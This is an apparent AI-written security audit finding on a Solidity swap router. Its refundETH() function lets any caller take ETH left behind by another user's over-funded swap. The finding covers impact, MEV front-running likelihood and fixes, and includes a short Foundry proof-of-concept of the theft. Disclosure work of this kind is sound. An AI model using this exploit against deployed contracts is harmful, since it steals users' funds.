Now I have all the information needed. Let me analyze the exact code paths.

The attack path is confirmed. Here is the complete analysis:

---

### Title
Unguarded `refundETH()` allows any caller to drain ETH stranded by a prior user's over-funded WETH swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`refundETH()` unconditionally transfers the router's entire native ETH balance to `msg.sender` with no ownership or per-depositor accounting. Because `pay()` wraps only the exact amount owed to the pool and leaves any excess `msg.value` in the contract, a subsequent caller can steal that residual ETH in a separate transaction.

### Finding Description

`refundETH()` contains no access control: [1](#0-0) 

`pay()`, called from the swap callback, wraps only the exact `value` owed to the pool when `nativeBalance >= value`, leaving `nativeBalance - value` ETH sitting in the contract: [2](#0-1) 

`exactInputSingle` is `payable` and performs no automatic refund after the swap completes: [3](#0-2) 

The `receive()` guard only blocks direct ETH pushes from non-WETH addresses; it does not prevent ETH from entering via any `payable` function call: [4](#0-3) 

The intended safe pattern is `multicall([exactInputSingle(...), refundETH()])` so that the refund is atomic. However, nothing in the contract enforces this. A user who calls `exactInputSingle{value: X}` directly with `X > amountIn` ends the transaction with `X - amountIn` ETH stranded in the router, claimable by anyone.

### Impact Explanation
Direct loss of user principal. Any ETH left in the router after a swap is immediately claimable by an unprivileged attacker via `refundETH()`. The original depositor receives nothing back. Impact is proportional to the over-funded amount; for large swaps with loose `msg.value` this can be the full excess.

### Likelihood Explanation
Medium-to-high. Users and integrators routinely send a rounded or worst-case `msg.value` when swapping WETH to avoid reverts from price movement. MEV bots can monitor the mempool for transactions that leave ETH in the router and front-run or back-run the victim's transaction with a `refundETH()` call in the same block.

### Recommendation
Two complementary fixes:

1. **Automatic refund in each swap entry point**: at the end of `exactInputSingle`, `exactInput`, `exactOutputSingle`, and `exactOutput`, call `_refundETHToSender()` that sends any remaining `address(this).balance` back to `msg.sender`.

2. **Caller-scoped `refundETH`**: record the depositing address in transient storage at the start of each `payable` entry point and restrict `refundETH()` to that address, or remove the public `refundETH()` entirely and rely on the automatic refund above.

### Proof of Concept

```solidity
// Foundry fork test (pseudo-code)
function test_refundETH_theft() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");

    uint128 amountIn = 0.5 ether;
    uint256 msgValue = 1 ether;          // victim over-funds by 0.5 ETH

    vm.deal(victim, msgValue);
    vm.prank(victim);
    router.exactInputSingle{value: msgValue}(
        ExactInputSingleParams({
            pool:            address(pool),
            tokenIn:         WETH,
            tokenOut:        token1,
            zeroForOne:      true,
            amountIn:        amountIn,
            amountOutMinimum: 0,
            recipient:       victim,
            deadline:        block.timestamp + 1,
            priceLimitX64:   0,
            extensionData:   ""
        })
    );
    // 0.5 ETH is now stranded in the router

    uint256 attackerBefore = attacker.balance;
    vm.prank(attacker);
    router.refundETH();                  // no access control

    assertEq(attacker.balance - attackerBefore, 0.5 ether); // attacker stole victim's ETH
    assertEq(address(router).balance, 0);
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-77)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```
